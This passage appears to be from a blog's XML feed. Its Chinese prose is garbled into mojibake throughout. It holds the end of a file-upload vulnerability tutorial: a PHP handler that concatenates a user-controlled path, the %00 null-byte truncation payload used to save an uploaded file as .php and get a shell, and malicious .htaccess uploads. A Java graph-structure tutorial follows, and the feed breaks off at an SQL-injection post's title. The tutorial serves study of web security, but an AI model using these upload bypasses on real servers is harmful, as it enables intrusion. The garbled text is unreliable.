punctuation">{</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$target_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šç›®å½•</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$target_name</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Stored in: <span class="token interpolation"><span class="token variable">$result</span></span>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid file"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æ­£ç¡®ç”¨æ³•</li></ul><p>åœ¨æ•°æ®åŒ…ä¸­ï¼Œå«æœ‰ä¸Šä¼ åæ–‡ä»¶ç›®å½•çš„æƒ…å†µæ‰å¯ä½¿ç”¨ã€‚æ¯”å¦‚åœ¨æ•°æ®åŒ…ä¸­å­˜åœ¨pathï¼š/uploads/</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227150039545.png" a="" style="zoom:67%;"><p>ä¸ºä»€ä¹ˆä¿®æ”¹pathæ‰å¯ä»¥ï¼Œå› ä¸ºç¨‹åºä¸­æ£€æµ‹çš„æ˜¯æ–‡ä»¶çš„åç¼€åï¼Œå¦‚æœåç¼€åˆæ³•åˆ™æ‹¼æ¥è·¯å¾„å’Œæ–‡ä»¶åï¼Œé‚£ä¹ˆæ”»å‡»è€…ä¿®æ”¹äº†pathä»¥åçš„æ‹¼æ¥ç»“æœä¸ºï¼šuploads/aaa.php%00/2018051413370000.jpgï¼Œç§»åŠ¨æ–‡ä»¶çš„æ—¶å€™ä¼šå°†æ–‡ä»¶ä¿å­˜ä¸ºuploads/aaa.phpï¼Œä»è€Œè¾¾åˆ°Getshellæ•ˆæœã€‚</p><h3 id="5ï¼‰-00ï¼ˆurldecodeï¼‰"><a href="#5ï¼‰-00ï¼ˆurldecodeï¼‰" class="headerlink" title="5ï¼‰%00ï¼ˆurldecodeï¼‰"></a>5ï¼‰%00ï¼ˆurldecodeï¼‰</h3><ul><li>ä¸ºä»€ä¹ˆè¦è¿›è¡Œurldecodeæ“ä½œå‘¢ï¼Ÿ</li></ul><p>åŸå› åœ¨äºä¸Šä¼ çš„è¡¨å•ä¸­æœ‰ä¸€ä¸ªenctypeçš„å±æ€§ï¼Œå¹¶ä¸”éœ€è¦enctype=â€multipart/form-dataâ€ (ä¸å¯¹è¡¨å•ä¸­æ•°æ®è¿›è¡Œç¼–ç )ï¼Œpathå¤§å¤šæ•°éƒ½æ˜¯å­˜æ”¾åœ¨è¡¨å•ä¸­çš„ï¼Œå› æ­¤éœ€è¦åœ¨æ•°æ®åŒ…ä¸­è¿›è¡Œurldecodeæ“ä½œä½¿%00å˜æˆå­—ç¬¦ä¸²ç»“æŸç¬¦å·ã€‚</p><ul><li>ç›´æ¥æ·»åŠ %00è€Œä¸è¿›è¡Œurldecodeæ“ä½œ</li></ul><p>å› ä¸ºpathä¹Ÿå¯ä»¥å­˜æ”¾åœ¨URLæˆ–è€…Cookieä¸­ï¼Œè€Œåœ¨æäº¤æ•°æ®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šå¯¹æ•°æ®åšä¸€æ¬¡urldecodeçš„æ“ä½œï¼Œè€Œåˆ°æœåŠ¡ç«¯ï¼Œä¼šå¯¹æ•°æ®è¿›è¡Œä¸€æ¬¡urldecodeçš„æ“ä½œï¼Œå› æ­¤å¦‚æœpathåœ¨éenctype=multipart/form-dataçš„è¡¨å•ä¸­æˆ–URL or Cookieä¸­çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥å†™%00ä¸éœ€è¦è¿›è¡ŒURLdecodeæ“ä½œï¼Œè®©æœåŠ¡ç«¯å¯¹%00è¿›è¡ŒURLè§£ç å³å¯ã€‚</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227150530357.png" style="zoom:80%;"><p>æ³¨æ„âš ï¸ï¼š</p><p>ç®€å•äº›è¯´ï¼Œpathåœ¨urlã€cookieæˆ–è€…ä¸Šä¼ æ–¹å¼ä¸æ˜¯multipart/from-dataçš„æ—¶å€™ï¼Œå°±ä¸ç”¨è¿›è¡Œå¯¹%00è¿›è¡Œurlè§£ç ã€‚</p><h1 id="ä¸ƒã€-htaccessæ–‡ä»¶ä¸Šä¼ "><a href="#ä¸ƒã€-htaccessæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä¸ƒã€ .htaccessæ–‡ä»¶ä¸Šä¼ "></a>ä¸ƒã€ .htaccessæ–‡ä»¶ä¸Šä¼ </h1><h2 id="7-1-htaccessæ–‡ä»¶ä»‹ç»"><a href="#7-1-htaccessæ–‡ä»¶ä»‹ç»" class="headerlink" title="7.1 .htaccessæ–‡ä»¶ä»‹ç»"></a>7.1 .htaccessæ–‡ä»¶ä»‹ç»</h2><p>.htaccessæ–‡ä»¶ (æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚ å®ƒæä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚ .htaccessæ–‡ä»¶æ˜¯ç”¨äºapacheæœåŠ¡å™¨ä¸‹çš„æ§åˆ¶æ–‡ä»¶è®¿é—®çš„é…ç½®æ–‡ä»¶ï¼Œå› æ­¤Nginxä¸‹æ˜¯ä¸ä¼šç”Ÿæ•ˆçš„ã€‚</p><p>.htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><h2 id="7-2-htaccess-æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"><a href="#7-2-htaccess-æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†" class="headerlink" title="7.2 .htaccess æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"></a>7.2 .htaccess æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†</h2><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227150806840.png" style="zoom:80%;"><p>ã€ä¸Šä¼ .htaccessæ–‡ä»¶è¦†ç›–æ›´æ”¹æœåŠ¡å™¨çš„é…ç½®ï¼ŒæŒ‰ç…§æ”»å‡»è€…ç›®æ ‡è§£ææ‰§è¡Œä¸Šä¼ çš„æ–‡ä»¶ã€‘</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼ æ¼æ´ </tag>
            
            <tag> åŸºç¡€çŸ¥è¯†åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›¾-å›¾çš„é€šç”¨ç»“æ„è¡¨è¾¾çš„å»ºç«‹</title>
      <link href="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/"/>
      <url>/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/</url>
      
        <content type="html"><![CDATA[<h1 id="1-å¼•è¨€"><a href="#1-å¼•è¨€" class="headerlink" title="1.å¼•è¨€"></a>1.å¼•è¨€</h1><p>â€ƒâ€ƒå›¾çš„è¡¨è¾¾æ–¹æ³•åƒåƒä¸‡ï¼Œå¹³æ—¶é€‰ä¸€ä¸ªè‡ªå·±æœ€å–œæ¬¢çš„ç»“æ„ï¼ŒæŠŠæ‰€æœ‰ç®—æ³•éƒ½åœ¨è¿™ä¸ªç»“æ„ä¸Šç©é€šï¼Œä»¥åé‡åˆ°é™Œç”Ÿçš„å›¾ç»“æ„è¡¨è¾¾ï¼Œè½¬åŒ–ä¸ºè‡ªå·±å–œæ¬¢çš„é‚£ä¸ªç»“æ„ï¼Œç„¶åç”¨è‡ªå·±å®ç°çš„ç®—æ³•å³å¯ã€‚é‡ç‚¹å°±æ˜¯å®ç°ä¸€ä¸ªæ¥å£å°†é™Œç”Ÿçš„å›¾è¡¨è¾¾æ•°æ®ç»“æ„è½¬åŒ–ä¸ºè‡ªå·±ç†Ÿæ‚‰çš„å›¾ç»“æ„è¡¨è¾¾ã€‚</p><h1 id="2-Nodeç±»"><a href="#2-Nodeç±»" class="headerlink" title="2.Nodeç±»"></a>2.Nodeç±»</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span><span class="token comment">//èŠ‚ç‚¹å€¼</span><span class="token keyword">public</span> <span class="token keyword">int</span> in<span class="token punctuation">;</span><span class="token comment">//å…¥åº¦</span><span class="token keyword">public</span> <span class="token keyword">int</span> out<span class="token punctuation">;</span><span class="token comment">//å‡ºåº¦</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nexts<span class="token punctuation">;</span><span class="token comment">//ä¸‹è¡Œçš„é‚»å±…èŠ‚ç‚¹</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token comment">//ä¸‹è¡Œè¾¹</span><span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token operator">=</span>value<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>in<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>out<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>nexts<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-Edgeç±»"><a href="#3-Edgeç±»" class="headerlink" title="3.Edgeç±»"></a>3.Edgeç±»</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Edge</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> weight<span class="token punctuation">;</span><span class="token comment">//è¾¹æƒ</span><span class="token keyword">public</span> <span class="token class-name">Node</span> from<span class="token punctuation">;</span><span class="token comment">//å§‹è¾¹</span><span class="token keyword">public</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">;</span><span class="token comment">//ç»ˆè¾¹</span><span class="token keyword">public</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> weight<span class="token punctuation">,</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span><span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//æ ¹æ®æä¾›çš„ä¸‰å…ƒç´ æ„å»ºä¸€ä¸ªè¾¹</span><span class="token keyword">this</span><span class="token punctuation">.</span>weight<span class="token operator">=</span>weight<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>from<span class="token operator">=</span>from<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">to</span><span class="token operator">=</span><span class="token keyword">to</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-Graphç±»"><a href="#4-Graphç±»" class="headerlink" title="4.Graphç±»"></a>4.Graphç±»</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Graph</span> <span class="token punctuation">{</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nodes<span class="token punctuation">;</span><span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>nodes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-å°†äºŒç»´çŸ©é˜µè¡¨ç¤ºçš„å›¾è½¬åŒ–ä¸ºGraphå½¢å¼çš„å›¾"><a href="#5-å°†äºŒç»´çŸ©é˜µè¡¨ç¤ºçš„å›¾è½¬åŒ–ä¸ºGraphå½¢å¼çš„å›¾" class="headerlink" title="5.å°†äºŒç»´çŸ©é˜µè¡¨ç¤ºçš„å›¾è½¬åŒ–ä¸ºGraphå½¢å¼çš„å›¾"></a>5.å°†äºŒç»´çŸ©é˜µè¡¨ç¤ºçš„å›¾è½¬åŒ–ä¸ºGraphå½¢å¼çš„å›¾</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenerateGraphFromMatrix</span> <span class="token punctuation">{</span><span class="token comment">//matrix </span><span class="token comment">//weight from to</span><span class="token comment">/* * [4,1,3] * [5,2,6] * [1,2,3] */</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Graph</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">Graph</span> g<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> weight<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> from<span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token keyword">to</span><span class="token operator">=</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//å¦‚æœæ²¡æœ‰èŠ‚ç‚¹ç¼–å·å°±å»åˆ›å»ºèŠ‚ç‚¹</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">Node</span> fromNode <span class="token operator">=</span> g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–fromèŠ‚ç‚¹</span><span class="token class-name">Node</span> toNode<span class="token operator">=</span>g<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–toèŠ‚ç‚¹</span><span class="token class-name">Edge</span> edge<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span>weight<span class="token punctuation">,</span> fromNode<span class="token punctuation">,</span> toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å»ºç«‹ä¸€æ¡è¾¹</span>g<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ”¾åˆ°gçš„è¾¹é›†åˆä¸­</span>fromNode<span class="token punctuation">.</span>nexts<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fromèŠ‚ç‚¹æ·»åŠ ä¸‹è¡ŒèŠ‚ç‚¹</span>fromNode<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>edge<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//from èŠ‚ç‚¹æ·»åŠ ä¸‹è¡Œè¾¹</span>fromNode<span class="token punctuation">.</span>out<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//fromèŠ‚ç‚¹å‡ºåº¦++</span>toNode<span class="token punctuation">.</span>in<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//toèŠ‚ç‚¹å…¥åº¦++</span><span class="token punctuation">}</span><span class="token keyword">return</span> g<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">Graph</span> graph <span class="token operator">=</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"èŠ‚ç‚¹æ•°:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¾¹æ•°:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1çš„å…¥åº¦:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>in<span class="token operator">+</span><span class="token string">",1çš„å‡ºåº¦:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1åˆ°3çš„ä»£ä»·:"</span><span class="token operator">+</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>edges<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/1009-01.jpeg" alt="æµ‹è¯•å›¾ä¾‹" style="zoom:50%;"><p>è¿è¡Œç»“æœ</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">èŠ‚ç‚¹æ•°:4è¾¹æ•°:31çš„å…¥åº¦:0,1çš„å‡ºåº¦:11åˆ°3çš„ä»£ä»·:4done!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/si-xiao-kai/AlgorithmDataStructure_stu/tree/main/base_graph">å®Œæ•´ä»£ç è§æˆ‘çš„github</a></p><h1 id="6-å°ç»“"><a href="#6-å°ç»“" class="headerlink" title="6.å°ç»“"></a>6.å°ç»“</h1><p>æœ¬æ–‡ä»‹ç»äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å›¾ç»“æ„çš„è¡¨è¾¾æ–¹æ³•ï¼Œæ–¹ä¾¿åœ¨ä¸Šé¢å®ç°å›¾çš„å„ç§ç®—æ³•ï¼Œå¹¶ä¸”å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å…¶ä»–å½¢å¼çš„å›¾çš„è¡¨ç¤ºå¦‚é‚»æ¥è¡¨ã€é‚»æ¥çŸ©é˜µç­‰è½¬åŒ–è¿‡æ¥ï¼Œè¿›è€Œé¿å…äº†åœ¨ä¸åŒç»“æ„ä¸Šé‡æ–°å®ç°å›¾ç®—æ³•çš„ç¹çæ“ä½œã€‚åç»­ä¼šé™†ç»­è®²è§£åŸºäºæœ¬æ–‡å®šä¹‰çš„å›¾ç»“æ„å®ç°çš„å„ç§å›¾ç®—æ³•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®ç»“æ„ä¸ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®ç»“æ„ </tag>
            
            <tag> ç®—æ³• </tag>
            
            <tag> java </tag>
            
            <tag> å›¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥åŸºç¡€</title>
      <link href="/2022/10/04/web-an-quan/sql-zhu-ru/"/>
      <url>/2022/10/04/web-an-quan/sql-zhu-ru/</url>
      
